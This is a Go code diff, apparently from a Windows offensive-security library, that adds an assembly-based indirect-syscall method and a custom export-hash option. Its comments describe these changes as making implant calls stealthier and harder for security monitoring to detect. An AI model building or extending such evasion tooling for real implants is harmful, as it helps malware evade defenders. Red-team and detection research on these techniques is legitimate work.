@@ -25,6 +25,12 @@ const (
 	// MethodIndirect uses a syscall;ret gadget inside ntdll (most stealthy).
 	// Call appears to originate from ntdll address space.
 	MethodIndirect
+
+	// MethodIndirectAsm performs an indirect syscall through a Go-assembly
+	// stub instead of a runtime byte-patched stub. Same gadget-in-ntdll
+	// effect as MethodIndirect, but no writable code page in the implant
+	// heap and no per-call VirtualProtect cycle. amd64 only.
+	MethodIndirectAsm
 )
 
 func (m Method) String() string {
@@ -37,6 +43,8 @@ func (m Method) String() string {
 		return "Direct"
 	case MethodIndirect:
 		return "Indirect"
+	case MethodIndirectAsm:
+		return "IndirectAsm"
 	default:
 		return "Unknown"
 	}
@@ -50,6 +58,10 @@ func (m Method) String() string {
 type Caller struct {
 	method   Method
 	resolver SSNResolver
+
+	// Optional custom hash function for CallByHash export-table lookups.
+	// nil means ROR13 (the default everywhere else in maldev).
+	hashFunc HashFunc
 
 	// Pre-allocated stub memory (allocated once as RW, cycled to RX per call).
 	directStub   uintptr
@@ -72,6 +84,17 @@ func New(method Method, r SSNResolver) *Caller {
 		c.indirectStub, _ = windows.VirtualAlloc(0, 64,
 			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	}
+	return c
+}
+
+// WithHashFunc sets the hash function used by CallByHash to walk the
+// ntdll export table. Pass the same fn used to pre-compute the funcHash
+// constants in the caller's binary — both ends must agree. Returns the
+// receiver for fluent construction.
+//
+// Pass nil to revert to the package default (ROR13).
+func (c *Caller) WithHashFunc(fn HashFunc) *Caller {
+	c.hashFunc = fn
 	return c
 }
 
